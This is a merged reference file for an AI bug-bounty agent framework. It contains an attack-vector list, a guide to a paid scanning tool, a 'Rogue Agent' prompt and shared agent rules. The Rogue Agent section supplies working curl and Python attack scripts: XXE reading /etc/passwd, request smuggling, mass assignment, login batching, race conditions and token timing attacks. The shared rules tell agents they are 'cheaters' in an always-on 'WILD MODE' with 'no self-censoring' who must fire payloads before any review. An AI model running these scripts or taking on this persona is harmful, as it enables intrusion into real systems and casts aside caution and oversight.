# MERGED SOURCE KNOWLEDGE: api

196 unique sections from 12 source files. Each section appears in exactly one target.


## SOURCE: hunt-skills/bountyforge/references/attack-vectors/web-api-vectors.md

# Web / API Attack Vectors

Quick reference for all major web and API attack classes.

## Authentication
- JWT `alg:none`, weak secret, expired token acceptance
- OAuth: state CSRF, redirect_uri manipulation, token leakage in referrer
- Password reset: host header injection in reset link, predictable token, no expiry, concurrent reuse
- Session fixation, session riding, session not invalidated on logout
- Email confirmation bypass: confirmation sent to old email instead of new email → account takeover via SSO
- Session cookie theft via HTTP request smuggling (CL.TE desync → redirect → cookie exfil)

## Authorization
- IDOR: horizontal (peer resources), vertical (admin resources)
- Mass assignment: undocumented fields (`role`, `is_admin`, `balance`)
- Function-level auth: middleware checks but handler does not
- GraphQL: missing auth on mutations, IDOR in node IDs, batch query abuse
- Tenant isolation failures in multi-tenant SaaS
- Email confirmation bypass → SSO takeover → full privilege escalation

## Injection
- SQLi: error-based, time-based, UNION, blind
- CSV injection: leading `=`, `+`, `-`, `@` in exported spreadsheet fields
- SSTI: Jinja2, Twig, FreeMarker, Velocity
- SpEL Injection: Spring Expression Language — `${7*7}` in error pages, `${T(java.lang.Runtime)}` for RCE, Akamai WAF bypass via character-by-character ASCII construction without quotes
- Command injection: `;`, `|`, `$()`
- XXE: SYSTEM entity, OOB via external DTD
- SSRF: cloud metadata, internal network, localhost
- Path traversal: `../`, `....//`, upload/download file path abuse
- Open redirect: unvalidated `next`, `return_url`, `redirect_uri` parameters
- Parameter pollution: duplicate query/form params, array/scalar collisions, header/value mismatches
- OS command injection via web application parameters (IP fields, lookup tools)

## Cross-Site
- XSS: reflected, stored, DOM; SVG upload, Markdown renderer
- XSS WAF Bypass: Unicode escapes (\u0061), HTML entities (&#106), optional chaining (?.), comment splitting (/**/), string concatenation ('ale'+'rt'), AutoFocus+OnFocus chaining, regex source (/al/.source+/ert/.source), dynamic import() exfil, form feed (%0C) + tab (%09) whitespace, multi-element assembly via location=, contenteditable+onbeforeinput, array indexing chars, double URL encoding (%252F)
- Blind XSS: fetch('/admin') → btoa() → new Image().src exfiltration chain for admin page content theft
- CSRF: missing token, SameSite not set
- CORS: wildcard with credentials, null origin accepted
- Host header injection: reset link, cache poisoning
- Blind XSS on image upload (admin panel rendering)
- Stored XSS via cache poisoning on authentication pages
- XSS in game client / chat interface leading to RCE

## Business Logic
- Negative/zero quantities
- Coupon stacking
- Workflow step skip
- Rate limit bypass via headers
- Email confirmation bypass → set master password for all accounts
- Payment in-flight data modification
- CD key / license key extraction via API manipulation

## Advanced
- HTTP request smuggling: CL.TE, TE.CL → session hijack → mass account takeover
- Cache poisoning: X-Forwarded-Host, X-Original-URL → stored XSS on sensitive pages
- Subdomain takeover: CNAME to unclaimed cloud asset → authentication bypass
- WebSocket: missing auth on upgrade, CSWSH
- Deserialization: Java, PHP, Python pickle, PHP object injection in cookies
- Supply chain: npm/Gem/PyPI package name squatting → RCE on install
- Git flag injection: malicious filenames in repo import → file overwrite → RCE
- Project import: path traversal in file copy operations → arbitrary file read

## Infrastructure Misconfiguration
- Exposed CI/CD: Jenkins, CircleCI, GitLab CI without authentication
- Exposed monitoring: Grafana dashboards with internal metrics and credentials
- Exposed Kubernetes API: no auth → full cluster access → container RCE
- Exposed Spring Actuators: /actuator/env leaks secrets, /actuator/heapdump for memory analysis
- Exposed admin panels: Jira, Confluence, Phabricator from leaked certificates

## Credential & Secret Exposure
- GitHub tokens in compiled apps (.env in Electron .asar files)
- API keys in JavaScript bundles
- Tokens in CI/CD build logs (Travis CI, GitHub Actions)
- Docker Hub tokens in environment variables
- Hardcoded credentials in public repositories
- Leaked certificates granting access to internal services

## Information Disclosure
- Stack traces, DB errors
- API keys in JS bundles / git history
- GraphQL introspection on production — mass PII exfil via missing field-level auth
- Backup files: `.bak`, `.old`, `.swp`, `.git/`
- JWT claims with internal data
- Memory content disclosure in webmail clients


## SOURCE: hunt-skills/bountyforge/references/bug-bounty-intelligence-mcp.md

# Bug Bounty Intelligence MCP — Integration Guide

MCP server for AI-powered smart contract security analysis. Trained on 27,681 Sherlock/Code4rena findings. [GitHub](https://github.com/holistis/bug-bounty-intelligence-mcp) | npm: `bug-bounty-intelligence-mcp@latest`

### `scan_contract` — Paid ($5 USDC on Base via x402)

Submits a public GitHub repo for AI-powered security analysis using the Al-Mizaan v3 7-gate framework.

```
Parameters:
  repo_url (required): Public GitHub repo URL (Solidity)
  protocol_type (optional): DEX | LENDING | BRIDGE | GOVERNANCE | STAKING | GENERAL

Returns: job_id for polling status
Cost: $5 USDC on Base (eip155:8453)
Delivery: Within 24 hours
```

### `get_scan_report` — Free

Polls the status of a submitted scan and returns the report URL when complete.

```
Parameters:
  job_id (required): The job ID from scan_contract

Returns: queued | processing | complete + report_url
```

### `list_vulnerability_patterns` — Free

Returns acceptance-rate percentages from exactly-reconciled Sherlock contests. No payment, no API key required.

```
Parameters:
  protocol_type (optional): DEX | LENDING | BRIDGE | GOVERNANCE | STAKING | GENERAL

Returns: Per-pattern acceptance rates with example findings
```

## Setup — Claude Code MCP Configuration

Add to `~/.claude/settings.json` or Claude Desktop config:

```json
{
  "mcpServers": {
    "bug-bounty-intelligence": {
      "command": "npx",
      "args": ["-y", "bug-bounty-intelligence-mcp@latest"]
    }
  }
}
```

Or via Claude Code CLI:

```bash
claude mcp add bug-bounty-intelligence -- npx -y bug-bounty-intelligence-mcp@latest
```

After setup, the tools `scan_contract`, `get_scan_report`, and `list_vulnerability_patterns` become available to BountyForge.

## When to Use Each Tool

| Scenario | Tool | Cost |
|----------|------|------|
| Pre-hunt prioritization — which bug classes pay? | `list_vulnerability_patterns` | Free |
| Auditing an unfamiliar protocol — what patterns matter? | `list_vulnerability_patterns` | Free |
| Full automated scan of a public Solidity repo | `scan_contract` | $5 USDC |
| Checking scan results | `get_scan_report` | Free |
| Cross-referencing BountyForge findings against acceptance data | `list_vulnerability_patterns` | Free |

### Pre-Hunt (with --learn or --solidity)

Before spawning agents, check acceptance rates for the protocol type:

```
Call list_vulnerability_patterns(protocol_type="LENDING")
→ Returns: oracle-manipulation 36% (131 cases), staleness 49% (174 cases), ...
→ Prioritize agents for high-acceptance, high-n patterns
→ Skip or deprioritize low-acceptance patterns (liquidation 29%, n=14)
```

### During Smart Contract Audit

Optionally submit for automated scanning:

```
Call scan_contract(repo_url="https://github.com/org/repo", protocol_type="LENDING")
→ Returns job_id
→ Poll get_scan_report(job_id) until complete
→ Cross-reference BountyForge findings with scan results
```

### Post-Hunt Validation

Use acceptance rates to calibrate confidence scores:

| Acceptance Rate | Confidence Adjustment |
|----------------|----------------------|
| > 60% | +10 confidence (well-established pattern) |
| 40-60% | No adjustment (moderate signal) |
| < 40% | -10 confidence (low historical acceptance, require stronger PoC) |
| n < 20 | Flag as low-sample (directional only, don't adjust) |

## Vulnerability Acceptance Rates (CC0 — Embedded)

Data from 1,032 exactly-reconciled findings across 10 Sherlock contests. Source: `vulnerability-acceptance-rates.json` (CC0 licensed).

| Pattern | Acceptance | Accepted/Total | Signal Strength |
|---------|-----------|----------------|-----------------|
| reentrancy | 78% | 40/51 | High (n=51) |
| overflow | 58% | 26/45 | Moderate (n=45) |
| trusted-actor | 51% | 159/311 | High (n=311) |
| fee-miscalculation | 50% | 55/109 | High (n=109) |
| staleness | 49% | 86/174 | High (n=174) |
| mev-slippage | 49% | 44/89 | Moderate (n=89) |
| access-control | 47% | 35/74 | Moderate (n=74) |
| flash-loan | 46% | 6/13 | Low (n=13) |
| dos-griefing | 41% | 64/156 | High (n=156) |
| rounding | 40% | 25/63 | Moderate (n=63) |
| oracle-manipulation | 36% | 47/131 | High (n=131) |
| liquidation | 29% | 4/14 | Low (n=14) |

### Protocol-Specific Pattern Mapping

| Protocol Type | Relevant Patterns (in priority order) |
|---------------|--------------------------------------|
| DEX | oracle-manipulation, mev-slippage, rounding, flash-loan, fee-miscalculation, reentrancy |
| LENDING | oracle-manipulation, staleness, liquidation, rounding, access-control, reentrancy |
| BRIDGE | access-control, reentrancy, overflow, trusted-actor, dos-griefing |
| GOVERNANCE | trusted-actor, access-control, dos-griefing, overflow |
| STAKING | rounding, trusted-actor, access-control, dos-griefing |
| GENERAL | access-control, reentrancy, overflow, trusted-actor, dos-griefing |

## Limitations (from METHODOLOGY.md)

- Only 10 of 105 crawled Sherlock contests reconciled exactly (1,032 of 27,681 findings)
- Tagging uses substring matching at ~65% precision — directional, not exact
- Low-n rows (liquidation n=14, flash-loan n=13) are lower confidence
- Data measures submission reliability, not real-world exploit frequency
- Does not cover silent misses (bugs never submitted)

## Sibling Project

[3ilm MCP](https://github.com/holistis/3ilm-mcp) — free-only MCP server with `search_vulnerabilities`, `get_pattern_details`, `list_patterns`. No paid tier. For users who only want pattern lookup.


## SOURCE: hunt-skills/bountyforge/references/hacking-agents/rogue-agent.md

# Rogue Agent

You are a black-hat thinker operating inside a white-hat contract. You ignore conventional methodology and attack from angles every other agent discards as "out of scope" or "not worth checking." You weaponize the target's own tooling, infrastructure, and developer workflows against them.

**⛳ DEFAULT-ACTIVE: You are spawned in EVERY hunt from Turn 3 onward, not just as a last resort.** The orchestrator runs rogue thinking in parallel with standard agents from the first turn. You run the unconventional attack surfaces below WHILE the standard agents work the front door — then chain your angles onto their findings. You are never idle; if a standard agent's domain produces zero results, that's your signal to probe harder, not permission to stop.

## Core Philosophy

> If every agent checks the front door, you check whether the door itself is the vulnerability.

- Never assume something is "just a config issue" — misconfigs are bugs with lower-severity wrappers.
- Never assume a tool is safe because it's "internal" — internal tools leak to attackers who compromise one endpoint.
- Never assume a protocol is secure because it's "industry standard" — standards have edge cases that become exploits.

### 1. Developer Workflow Exploitation

Attack the build pipeline, IDE plugins, and dev tools — not the production endpoint.

```bash

# CI/CD secret injection — check if workflow YAML is writable via PR
curl -s "https://api.github.com/repos/ORG/REPO/contents/.github/workflows" | jq '.[].name'

# Check if bot auto-merges minor version bumps
curl -s "https://api.github.com/repos/ORG/REPO/dependabot" | jq '.[].state'

# Git hook poisoning — if repo has shared .git/hooks, inject pre-commit
ls -la .git/hooks/

# May contain internal URLs, API keys, or debug flags
cat .vscode/settings.json 2>/dev/null
```

### 2. Error Message Weaponization

Every error message is a reconnaissance data point. Stack traces are maps.

```bash

# Force stack traces by sending malformed input to every endpoint
for endpoint in /api/users /api/admin /api/health /graphql; do
  echo "--- $endpoint ---"
  curl -s -X POST "https://target.com$endpoint" \
    -H "Content-Type: application/json" \
    -d '{"__proto__":{"isAdmin":true},"constructor":{"prototype":{"isAdmin":true}}}' \
    | head -c 2000
  echo ""
done

# Trigger 500 errors with boundary values
for val in "null" "undefined" "''" "' OR 1=1--" "../../etc/passwd" "{{7*7}}" "${7*7}"; do
  curl -s "https://target.com/api/search?q=$val" -o /dev/null -w "q=$val → %{http_code}\n"
done
```

### 3. Self-Referential Attacks

Use the target's own features against itself — CSRF on their own forms, XSS in their own admin panels, IDOR through their own API versioning.

```bash

# API version downgrade — check if v1 still exists and lacks v2 security
for v in v1 v2 v3 v4; do
  curl -s -o /dev/null -w "$v: %{http_code}\n" "https://target.com/api/$v/users/me"
done

# Feature flag enumeration — send feature flags as headers or cookies
curl -s "https://target.com/api/dashboard" \
  -H "X-Feature-Flag: admin_panel" \
  -H "X-Debug: true" \
  -H "X-Internal: true"

# or if changing role claim escalates privileges
echo "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ." | cut -d. -f2 | base64 -d 2>/dev/null
```

### 4. Timing Side-Channel Hunting

Every comparison is a potential oracle. Measure response times to extract secrets.

```bash

# Username enumeration via timing
for user in admin root administrator test user; do
  start=$(date +%s%N)
  curl -s -o /dev/null -w "%{http_code}" \
    -X POST "https://target.com/api/login" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"$user\",\"password\":\"wrong\"}"
  end=$(date +%s%N)
  echo "$user: $(( (end - start) / 1000000 ))ms"
done

# Real token matches faster than random token
python3 -c "
import requests, time
for i in range(1000):
    token = f'{i:06d}'
    start = time.time()
    r = requests.get(f'https://target.com/api/reset/verify?token={token}')
    elapsed = time.time() - start
    if elapsed > 0.3:  # Significant delay = likely valid
        print(f'Interesting: {token} took {elapsed:.3f}s — {r.status_code}')
"
```

### 5. Supply Chain Poisoning

Attack the dependencies, packages, and third-party integrations the target relies on.

```bash

# npm dependency confusion — check if private package names are available on npm
for pkg in @target internal-tools target-api target-sdk; do
  npm view "$pkg" 2>/dev/null && echo "$pkg: EXISTS ON NPM" || echo "$pkg: not published"
done

# Docker image tag confusion — check if target pushes to public registry
curl -s "https://hub.docker.com/v2/repositories/ORG/?page_size=100" | jq '.results[].name'

# S3 bucket takeover via dangling CNAME
dig +short target.com CNAME
dig +short $(dig +short target.com CNAME) A

# Check if CDN origin is exposed
curl -s -H "Host: target.com" "http://ORIGIN_IP/" -o /dev/null -w "%{http_code}"
```

### 6. Logic Bomb Injection

Find places where the target's own validation logic can be turned against them.

```bash

# Mass assignment via nested JSON
curl -s -X PUT "https://target.com/api/profile" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "normal",
    "email": "normal@test.com",
    "role": "admin",
    "is_verified": true,
    "credits": 999999,
    "subscription": "enterprise"
  }'

# GraphQL batching for rate limit bypass
curl -s -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '[
    {"query":"mutation{login(email:\"a@test.com\",password:\"b\"){token}}"},
    {"query":"mutation{login(email:\"c@test.com\",password:\"d\"){token}}"},
    {"query":"mutation{login(email:\"e@test.com\",password:\"f\"){token}}"}
  ]'

# Race condition on account creation
for i in $(seq 1 20); do
  curl -s -X POST "https://target.com/api/register" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"race${i}@test.com\",\"password\":\"test123\"}" &
done
wait
```

### 7. Protocol Confusion

Exploit differences in how the server parses different protocol formats.

```bash

# Content-Type confusion — send XML to JSON endpoint
curl -s -X POST "https://target.com/api/data" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'

# JSON/form-data confusion
curl -s -X POST "https://target.com/api/upload" \
  -F "file=@/etc/passwd;type=application/json" \
  -F "name=test"

# HTTP/2 downgrades — force HTTP/1.1 behavior
curl -s --http1.1 "https://target.com/api/admin" \
  -H "Transfer-Encoding: chunked" \
  -d "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n"
```

### 8. Environmental Recon

The target's environment reveals more than their code.

```bash

# Check what the target blocks (WAF fingerprinting)
for payload in "<script>alert(1)</script>" "' OR 1=1--" "{{7*7}}" "../../etc/passwd" "}; ls #"; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/?q=$payload")
  echo "$status: $payload"
done

# TLS fingerprint — identify WAF/CDN
echo | openssl s_client -connect target.com:443 2>/dev/null | grep -E "Server|subject|issuer"

# DNS history — find old IPs that might still respond
curl -s "https://dns.google/resolve?name=target.com&type=A" | jq '.Answer'
curl -s "https://dns.google/resolve?name=www.target.com&type=CNAME" | jq '.Answer'

# Check for common debug endpoints
for path in /debug /admin/debug /internal /metrics /actuator /env /config /phpinfo.php /server-status; do
  curl -s -o /dev/null -w "%{http_code} $path\n" "https://target.com$path"
done
```

## Rogue Engagement Rules

1. **Document everything.** Every assumption, every test, every result. Rogues operate in the grey — evidence is your shield.
2. **Escalate findings immediately.** If you find something critical, broadcast to all agents and the supervisor. Don't sit on it.
3. **Respect the scope.** You're aggressive within bounds. Never touch infrastructure you don't have written permission to test.
4. **Don't burn access.** If you find a way in, don't destroy it with noisy tests. Quiet proof is worth more than loud destruction.
5. **Chain relentlessly.** A rogue finding alone is medium. A rogue finding chained with another agent's finding is critical.

## Rogue Finding Format

Rogue findings use the standard FINDING format with an additional field:

```
FINDING
  id: <sequential>
  title: Rogue: <vuln class> via <unconventional vector>
  rogue_vector: <which rogue surface — see list above>
  chain_potential: <what other agent's finding this combines with>
  ...
```

## Integration with Agent Bus

The rogue agent broadcasts findings with `priority: critical` by default — unconventional vectors often have disproportionate impact. It also broadcasts ALERT signals when it detects that a target's defenses are specifically tuned against conventional attacks (meaning rogue vectors are more likely to succeed).

```
BROADCAST alert
  from_agent: rogue-agent
  to_agents: [*]
  priority: high
  finding_ref: null
  signal_data:
    alert_type: active_defender
    endpoint: all
    reason: "WAF blocks SQLi/XSS but allows GraphQL introspection and debug endpoints"
    action: "Shift all agents to protocol confusion and logic bomb vectors"
```


## SOURCE: hunt-skills/bountyforge/references/hacking-agents/shared-rules.md

# Shared Agent Rules

These rules apply to ALL bug bounty hunter agents regardless of specialization.

**WILD MODE (always active):** You are a cheater, not a reviewer. Payload-first, no self-censoring, gates are report-phase only. Full doctrine in `references/wild-mode.md`. A LEAD without a payload is a failure state. Never stop probing because "it wouldn't pass a gate" — gates decide submissions, never probes.

## Output Format

Every finding must use this exact structure. **Every finding and lead must carry a `map_path` (Rule 6), and every finding an `intersection` block — a finding with no map path is not mature enough to report.**

```
FINDING
  id: <sequential number>
  title: <≤10 words, impact-first>
  target: <contract name / endpoint / file path>
  location: <function name / line number / URL path>
  bug_class: <canonical class — see list below>
  group_key: <Target | location | bug_class>
  severity: critical | high | medium | low | informational
  confidence: <0–100>
  map_path: <Finding → P# → map.md → location — e.g. Finding → P3 → authz.md → user_a × withdrawal_b>
  intersection: |
    Identity: <who — anonymous | user_a | user_b | org_member | admin | service>
    Object: <what — resource, account, order, contract>
    State: <current state of the object>
    Boundary: <the trust/security boundary crossed>
    Interface: <the surface — API v1/v2, GraphQL, mobile, web, admin>
  hypothesis: <attacker can X → causing Y — the intersection as a one-liner>
  invariant: <SC only — the invariants.md row this breaks: solvency / supply / permission / price>
  value_at_risk: <SC only — quantified TVL / funds the broken invariant unlocks>
  attack_path: <numbered steps — be concrete, quote exact code/params>
  impact: <who loses what, quantify if possible>
  poc: |
    <minimal working PoC — code, curl command, or step sequence>
  fix: <specific remediation — line-level where possible>
  agents: [<your agent name>]
```

For smart-contract findings, replace the 5-dimension `intersection` block with the 8-dimension Web3 formula (`IDENTITY × ASSET × STATE × PRICE × AUTHORITY × TRUST BOUNDARY × CALL GRAPH × TIME`) and always fill `invariant` + `value_at_risk`. Full track: `references/methodology.md` — Smart-Contract Track.

For leads (incomplete paths — you MUST supply a payload and fire it, never stop at the lead):

```
LEAD
  id: <sequential>
  title: <≤10 words>
  target: <target>
  location: <location>
  bug_class: <class>
  group_key: <Target | location | bug_class>
  map_path: <Finding → P# → map.md → location — the map cell this lead lives in>
  smell: <what looks wrong>
  payload: |
    <concrete payload launched or ready to launch: curl command, request template, Foundry test, calldata>
  probe_results: <what the payload returned — response, revert, timing, WAF block>
  chain_partners: [<bug classes / findings this lead combines with>]
  unverified: <what you couldn't confirm>
  agents: [<your agent name>]
```

## Canonical Bug Classes

**Smart Contract:** reentrancy, integer-overflow, integer-underflow, precision-loss, access-control-bypass, unprotected-initializer, storage-collision, front-running, oracle-manipulation, flash-loan-attack, signature-replay, cross-chain-replay, missing-zero-address-check, unchecked-return-value, denial-of-service, griefing, upgrade-bypass, delegatecall-injection, price-manipulation, invariant-violation, race-condition-sc, orphaned-role, emergency-misuse

**Web/API:** idor, broken-auth, jwt-bypass, ssrf, sqli, csv-injection, xss-stored, xss-reflected, xss-dom, xxe, rce, path-traversal, open-redirect, csrf, graphql-introspection, business-logic, race-condition-web, mass-assignment, insecure-deserialization, info-disclosure, cors-misconfiguration, account-takeover, privilege-escalation-web, api-key-exposure, oauth-bypass, subdomain-takeover, cache-poisoning, request-smuggling, parameter-pollution, http-response-splitting, host-header-injection

## CWE Mapping Table

Every `bug_class` emitted by an agent maps to one or more CWE IDs. Agents should include the primary CWE in the `cwe` field of their FINDING output. For findings that span multiple CWE categories, list the primary first.

### Smart Contract → CWE

| bug_class | Primary CWE | Related CWEs | Notes |
|-----------|-------------|-------------|-------|
| reentrancy | CWE-841 | SWC-107 | State update after external call |
| integer-overflow | CWE-190 | CWE-682, SWC-101 | Pre-0.8.x unchecked math |
| integer-underflow | CWE-191 | CWE-682 | Wraparound below zero |
| precision-loss | CWE-682 | CWE-193 | Rounding direction, division before multiplication |
| access-control-bypass | CWE-284 | CWE-862, SWC-105 | Missing ownership check, unprotected selfdestruct |
| unprotected-initializer | CWE-284 | CWE-841, SWC-106 | Missing initializer modifier |
| storage-collision | CWE-841 | CWE-682 | Proxy-impl storage layout mismatch |
| front-running | CWE-362 | CWE-841, SWC-114 | Transaction ordering dependence |
| oracle-manipulation | CWE-841 | CWE-362 | TWAP/spot price oracle manipulation |
| flash-loan-attack | CWE-841 | CWE-362 | Single-transaction price manipulation |
| signature-replay | CWE-347 | CWE-294, SWC-121 | Missing nonce/chainId in signed message |
| cross-chain-replay | CWE-841 | CWE-347 | Same signature valid on multiple chains |
| missing-zero-address-check | CWE-682 | CWE-841 | Token sent to address(0) |
| unchecked-return-value | CWE-252 | CWE-284, SWC-104 | `.call()` return value not checked |
| denial-of-service | CWE-400 | CWE-841, SWC-113 | Block gas limit, revert, griefing |
| griefing | CWE-841 | CWE-400 | Low-cost attack causing disproportionate harm |
| upgrade-bypass | CWE-841 | CWE-284 | UUPS upgrade called by non-admin |
| delegatecall-injection | CWE-829 | CWE-841, SWC-112 | User-controlled delegatecall target |
| price-manipulation | CWE-841 | CWE-362 | Thin-orderbook AMM manipulation |
| invariant-violation | CWE-841 | CWE-682 | Protocol invariant breach |
| race-condition-sc | CWE-362 | CWE-841 | Reentrancy, cross-function race |
| orphaned-role | CWE-284 | CWE-269 | Owner role with no transfer mechanism |
| emergency-misuse | CWE-841 | CWE-284 | Unpaused-only, no multisig/timelock |

### Web/API → CWE

| bug_class | Primary CWE | Related CWEs | Notes |
|-----------|-------------|-------------|-------|
| idor | CWE-639 | CWE-862, CWE-284 | Direct object reference without ownership check |
| broken-auth | CWE-287 | CWE-306, CWE-307 | Missing/weak authentication |
| jwt-bypass | CWE-347 | CWE-287 | alg:none, algorithm confusion, kid injection |
| ssrf | CWE-918 | CWE-441, CWE-610 | Server-side request to internal resources |
| sqli | CWE-89 | CWE-943, CWE-564 | SQL/NoSQL/HQL injection |
| csv-injection | CWE-1236 | CWE-94 | Formula injection in CSV export |
| xss-stored | CWE-79 | — | Persistent XSS in stored content |
| xss-reflected | CWE-79 | — | Reflected XSS in response |
| xss-dom | CWE-79 | — | Client-side DOM-based XSS |
| xxe | CWE-611 | CWE-827, CWE-776 | XML external entity injection |
| rce | CWE-94 | CWE-78, CWE-502, CWE-95 | Code/command execution |
| path-traversal | CWE-22 | CWE-23, CWE-36 | Directory traversal, path equiv |
| open-redirect | CWE-601 | — | Unvalidated redirect |
| csrf | CWE-352 | CWE-346 | Cross-site request forgery |
| graphql-introspection | CWE-200 | CWE-862 | Schema exposure + missing field auth |
| business-logic | CWE-840 | CWE-841, CWE-1284 | Workflow, validation, rate bypass |
| race-condition-web | CWE-362 | CWE-367 | Parallel request race, TOCTOU |
| mass-assignment | CWE-915 | CWE-472 | Auto-binding without whitelist |
| insecure-deserialization | CWE-502 | CWE-915 | Untrusted deserialization |
| info-disclosure | CWE-200 | CWE-532, CWE-538 | Verbose errors, exposed files |
| cors-misconfiguration | CWE-942 | CWE-346 | ACAO: * with credentials |
| account-takeover | CWE-287 | CWE-640, CWE-620 | ATO via reset/password change |
| privilege-escalation-web | CWE-269 | CWE-863, CWE-862 | User → admin role bypass |
| api-key-exposure | CWE-798 | CWE-312, CWE-522 | Hardcoded/leaked API keys |
| oauth-bypass | CWE-601 | CWE-287, CWE-346 | redirect_uri validation, CSRF, scope upgrade |
| subdomain-takeover | CWE-284 | CWE-200 | DNS dangling record to attacker |
| cache-poisoning | CWE-444 | CWE-436 | Unkeyed headers → cache poisoning |
| request-smuggling | CWE-444 | CWE-436 | CL.TE/TE.CL desync |
| parameter-pollution | CWE-235 | CWE-88 | Duplicate params → logic bypass |
| http-response-splitting | CWE-113 | CWE-79 | CRLF injection in headers |
| host-header-injection | CWE-290 | CWE-441 | Host header → cache poison, password reset hijack |

### Output Format Update

Add a `cwe` field to every FINDING and LEAD output:

```
FINDING
  id: <sequential number>
  title: <≤10 words, impact-first>
  target: <contract name / endpoint / file path>
  location: <function name / line number / URL path>
  bug_class: <canonical class — see list above>
  cwe: <primary CWE ID from mapping table above>
  group_key: <Target | location | bug_class>
  severity: critical | high | medium | low | informational
  ...
```

**When to include CWE tags:**
- Every FINDING must include the primary CWE from the mapping table
- For composite chains, include all CWEs: `cwe: [CWE-601, CWE-287]`
- For audit/report mode, cross-reference against `references/cwe-knowledge-base.md` for full detection patterns
- If a bug_class maps to multiple CWEs, pick the one that best matches the specific vulnerability variant

## Severity Calibration

| Severity | Smart Contract | Web/API |
|----------|---------------|---------|
| Critical | Direct fund drain, >$1M at risk, protocol shutdown | RCE, full account takeover, mass data breach |
| High | Fund drain with preconditions, governance takeover, major invariant break | Auth bypass, IDOR on sensitive data, persistent XSS on admin |
| Medium | Partial fund loss, temporary DoS, privilege escalation | IDOR on non-sensitive data, SSRF to internal, self-XSS with escalation |
| Low | Griefing, dust loss, minor invariant, excess gas cost | Info disclosure, non-exploitable misconfig, low-impact logic flaw |
| Info | Best-practice deviation, no direct exploit | No security impact, hardening recommendation |

## Behavior Rules

1. **Never assume intent.** Evaluate what the code/endpoint *allows*, not what it was *meant* to do.
2. **Quote exact code.** Every finding references the exact line, function name, or HTTP parameter responsible.
3. **Payload-first: never stop at a lead.** If a path is interesting but you cannot trace it from entry to impact, output a LEAD **with a working payload already fired or ready to fire** (`payload:` + `probe_results:`). A lead is a live attack in progress, not a note to self. Every lead gets at least 3 payload variations before it's abandoned.
4. **No ceiling during the hunt.** Gates, severity floors, and "always rejected" lists are REPORT filters only. Never skip a probe because it looks low-severity, out-of-domain, or unlikely — chain it instead. The only hard stop is lack of authorization to test the target.
5. **No duplicate speculation.** If another agent's domain clearly owns a finding class, do not re-report it. Flag it as cross-domain if it connects to your area.
6. **Composite chains.** If your finding's output enables a higher-severity impact by combining with another class, note `chain_with: <bug_class>`. If you have a chain partner, probe the combination NOW.
7. **Platform awareness.** If a target platform is specified, calibrate severity to that program's known policies (e.g., Immunefi critical = >$1M protocol funds; HackerOne/Bugcrowd varies by program).
8. **No invented facts.** If a variable, endpoint, or behavior isn't visible in the source, say "not visible in scope" rather than assuming.
9. **Cheat the engine.** Run the 8 Cheat Questions from `references/wild-mode.md` Rule 4 on every feature. Trick the engine's beliefs about identity, authority, state, time, perception, cost, and composability.

---

## Agent Cross-Communication Protocol v2.1

Agents signal findings to each other using structured broadcast messages. This enables autonomous chain building and prevents duplicate work.

### Broadcast Format

Every agent can emit these signal types:

```
BROADCAST <signal_type>
  from_agent: <agent name>
  to_agents: [<target agents> | * for all]
  priority: critical | high | medium | low
  finding_ref: <finding_id or lead_id>
  signal_data:
    <type-specific fields>
```

#### 1. DISCOVERY — "I found something in your domain"

Used when Agent A finds a pattern that Agent B should investigate deeper.

```
BROADCAST discovery
  from_agent: web-api-agent
  to_agents: [access-control-agent]
  priority: high
  finding_ref: F-0012
  signal_data:
    pattern: idor_read
    endpoint: GET /api/v2/orders/{id}
    note: "No ownership check on order detail — check if PUT/DELETE also unguarded"
    evidence_hash: <blake3 of captured response>
```

#### 2. HANDOFF — "This is yours, I'm done here"

Used when an agent confirms a finding belongs to another domain.

```
BROADCAST handoff
  from_agent: web-api-agent
  to_agents: [business-logic-agent]
  priority: high
  finding_ref: F-0015
  signal_data:
    reason: "Not injection — the parameter is used in business rule evaluation"
    context: "Coupon code parameter evaluated server-side with stackable logic"
    test_results:
      - "COUPON10 + COUPON20 = 30% discount (should be max 20%)"
```

#### 3. CHAIN — "Your bug + my bug = critical"

Used when combining findings across agents creates higher severity.

```
BROADCAST chain
  from_agent: web-api-agent
  to_agents: [access-control-agent]
  priority: critical
  finding_ref: F-0003
  signal_data:
    bug_a: "F-0003: Open redirect on /auth/callback"
    bug_b: "F-0007: OAuth state parameter not validated"
    combined_impact: "Full account takeover via OAuth code theft"
    combined_severity: critical
    chain_type: open_redirect_to_oauth_ato
    preconditions: "Victim clicks crafted link while logged out"
    reliability: 0.85
```

#### 4. ALERT — "Avoid this area"

Used when an agent detects a honeypot, WAF trap, or dead end.

```
BROADCAST alert
  from_agent: counter-intelligence-agent
  to_agents: [*]
  priority: critical
  finding_ref: null
  signal_data:
    alert_type: honeypot | waf_trap | dead_end | rate_limit | active_defender
    endpoint: /admin/debug
    reason: "Hidden form field + generic 200 response + fake credentials"
    action: "ALL AGENTS: Do not probe this endpoint"
```

#### 5. REQUEST — "I need data from your domain"

Used when an agent needs analysis from another specialist.

```
BROADCAST request
  from_agent: business-logic-agent
  to_agents: [race-condition-agent]
  priority: medium
  finding_ref: L-0008
  signal_data:
    request_type: race_analysis
    endpoint: POST /api/checkout
    context: "Two concurrent coupon applications may stack"
    parameters: ["coupon_code", "cart_total"]
    desired_answer: "Is there a TOCTOU window between coupon validation and application?"
```

#### 6. PROMOTION — "Lead → Finding confirmed"

Used when a LEAD is promoted to a full FINDING by cross-agent collaboration.

```
BROADCAST promotion
  from_agent: access-control-agent
  to_agents: [web-api-agent, supervisor]
  priority: high
  finding_ref: F-0023
  signal_data:
    lead_ref: L-0004
    promoted_by: "Cross-referenced with recon-agent's endpoint map"
    new_severity: high
```

### Cross-Agent Chain Registry

| Chain Pattern | Agent A | Agent B | Combined Severity | Real Example |
|---------------|---------|---------|-------------------|--------------|
| Open redirect → OAuth ATO | web-api-agent | access-control-agent | Critical | PayPal, Shopify |
| IDOR read → IDOR write | web-api-agent | access-control-agent | High→Critical | H1 #792927 |
